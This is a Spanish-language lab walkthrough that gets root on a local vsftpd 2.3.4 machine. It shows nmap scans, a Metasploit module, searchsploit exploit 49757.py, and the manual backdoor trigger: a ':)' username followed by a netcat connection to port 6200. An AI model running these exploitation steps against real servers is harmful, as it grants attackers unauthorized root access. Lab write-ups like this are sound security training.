
<p align="center">
    <img src="../img/Pasted_image_20250101095039.png" width="500">
</p>


## **Enumeración**

#### Escaneo de puertos

Realizamos un escaneo de puertos básico con **nmap** para identificar los puertos que están abiertos:
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101095829.png" width="500">
</p>

**Resultados del escaneo:**

| Puerto | Estado | Servicio |     |
| ------ | ------ | -------- | --- |
| 21/tcp | open   | ftp      |     |

Realizamos un segundo escaneo a los puertos abiertos, lanzando una serie de script por defecto de `nmap` y reconocimiento de servicios.
```
nmap -p21 -sVC --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101095909.png" width="500">
</p>



| Puerto | Estado | Servicio | Versión      |
| ------ | ------ | -------- | ------------ |
| 21/tcp | open   | ssh      | vsftpd 2.3.4 |

---


<h3><center> Análisis FTP (puerto 21)</center></h3>
Para enumerar bien el servicio `ftp`, siempre es aconsejable lanzar algunos script que tiene nmap por defecto, para localizar cuales son esos script, podemos ejecutar el comando.
```
locate .nse | grep "ftp"
```

<p align="center">
    <img src="../img/Pasted_image_20250101101354.png" width="500">
</p>

###### **Explicación de los scripts:**
- **ftp-anon.nse:** Este script verifica si un servidor FTP permite el acceso anónimo. Es decir, si permite conectarse sin necesidad de un nombre de usuario y contraseña.
- **ftp-bounce.nse:** Este script intenta realizar un ataque de "bouncing" (rebote) en un servidor FTP. Este tipo de ataque se utiliza para intentar acceder a otros sistemas a través del servidor FTP como intermediario.
- **ftp-brute.nse:** Este script realiza un ataque de fuerza bruta contra un servidor FTP, intentando adivinar las credenciales de acceso (usuario y contraseña).
- **ftp-libopie.nse:** Este script verifica si el servidor FTP soporta el protocolo LIBOPIE, que es un protocolo de autenticación más antiguo y menos seguro.
- **ftp-proftpd-backdoor.nse:** Este script busca una puerta trasera específica en servidores FTP que utilizan el software ProFTPD. Esta puerta trasera podría permitir a un atacante obtener acceso no autorizado al servidor.
- **ftp-syst.nse:** Este script envía el comando "SYST" al servidor FTP para obtener información sobre el sistema operativo del servidor.
- **ftp-vsftpd-backdoor.nse:** Similar al anterior, este script busca una puerta trasera específica en servidores FTP que utilizan el software vsftpd.
- **ftp-vuln-cve2010-4221.nse:** Este script busca una vulnerabilidad específica (CVE-2010-4221) en servidores FTP, la cual podría permitir a un atacante ejecutar código arbitrario en el servidor.
- **tftp-enum.nse:** Este script enumera las opciones y capacidades de un servidor TFTP (Trivial File Transfer Protocol).
- **tftp-version.nse:** Este script intenta determinar la versión del servidor TFTP.



---
## Explotación


Buscamos si existe alguna vulnerabilidad para el protocolo *FTP* con esa versión.
```
searchsploit vsftpd 2.3.4
```

<p align="center">
    <img src="../img/Pasted_image_20250101100129.png" width="500">
</p>


Vemos que no encontró dos `exploit`, para esta versión de `ftp`. Primero vamos a usar la de `metasploit`.

---
#### METASPLOIT

Vamos a realizar la enumeración con `metasploit`. Así que iniciamos `metasploit`
```
msfconsole
```

<p align="center">
    <img src="../img/Pasted_image_20241231173916.png" width="500">
</p>

Buscamos de nuevo el exploit.
```
search vsftpd 2.3.4
```

<p align="center">
    <img src="../img/Pasted_image_20250101100340.png" width="500">
</p>


Usamos el módulo
```
use 0
```

<p align="center">
    <img src="../img/Pasted_image_20250101100413.png" width="500">
</p>


Mostramos las opciones
```
show options
```
<p align="center">
    <img src="../img/Pasted_image_20250101100445.png" width="500">
</p>


Modificamos las opciones necesarios. En este caso solo debemos especificar la IP de la máquina vicitma.
```
set RHOSTS 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101100727.png" width="500">
</p>


Ejecutamos el exploit.
```
exploit
```

<p align="center">
    <img src="../img/Pasted_image_20250101100928.png" width="500">
</p>

Obtuvimos el usuario `root`.

---


#### Python

Como vimos anteriormente, también teníamos un módulo en `python`. Vamos a realizar la explotación con ese módulo. Si volvemos a buscar los exploit relacionados con las versión del protocolo `FTP`, nos indica.
```
searchsploit vsftpd 2.3.4
```

<p align="center">
    <img src="../img/Pasted_image_20250101100129.png" width="500">
</p>


Descargamos el exploit.
```
searchsploit -m 49757.py
```

<p align="center">
    <img src="../img/Pasted_image_20250101101922.png" width="500">
</p>


Por comodidad voy a cambiarle el nombre.
```
mv 49757.py exploit.py
```

<p align="center">
    <img src="../img/Pasted_image_20250101102024.png" width="500">
</p>

Ejecutamos el exploit
```
python3 exploit.py 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101102253.png" width="500">
</p>


Obtuvimos el usuario `root`.

---


#### Manualmente

Esta versión de `FTP` *vsftpd 2.3.4.*, tiene una vulnerabilidad curiosa y relativamente simple. Esta vulnerabilidad se aprovecha de una característica inesperada y poco convencional: **al introducir un simple emoticono ":)" en el campo de usuario al conectarse al servidor, se obtiene acceso a una shell con privilegios de root**.

**¿Cómo funciona?**

Al parecer, alguien modificó el código fuente original de vsftpd 2.3.4 de manera maliciosa. Esta modificación oculta un "backdoor" (puerta trasera) que se activa al introducir el emoticono en el campo de usuario. En lugar de iniciar sesión como un usuario normal, el servidor interpreta este símbolo como una señal para otorgar acceso a una shell con los máximos privilegios (root).

**¿Cómo se descubre esta vulnerabilidad?**

Esta vulnerabilidad se descubrió al realizar un escaneo de puertos y al intentar conexiones con diferentes valores en el campo de usuario. Al introducir el emoticono, se observó que se abría un nuevo puerto (6200) que proporcionaba acceso a una shell con privilegios de root.


## Explotación

Entramos al protocolo `FTP`. Y cuando nos pregunte por el usuario podemos `hola:)` y presionamos `ENTER` y cuando nos pregunte por la contraseña podemos cualquier cosa.
```
ftp 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101103204.png" width="500">
</p>


Se quedará un tiempo pensando como para intentar darnos acceso al `ftp`, pero si en otra terminal realizamos un escaneo de los puertos abiertos.
```
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
```

<p align="center">
    <img src="../img/Pasted_image_20250101103341.png" width="500">
</p>


Vemos que encontramos un nuevo puertos abierto que antes no nos había dado información `nmap`. Por introducir un simple carácter como `:)`, pudimos ver como el puerto *6200* apareció. Para explotarlo utilizamos `netcat`, para conectarnos a este puerto.
```
nc 172.17.0.2 6200
```

<p align="center">
    <img src="../img/Pasted_image_20250101103628.png" width="500">
</p>


Somo el usuario `root`.



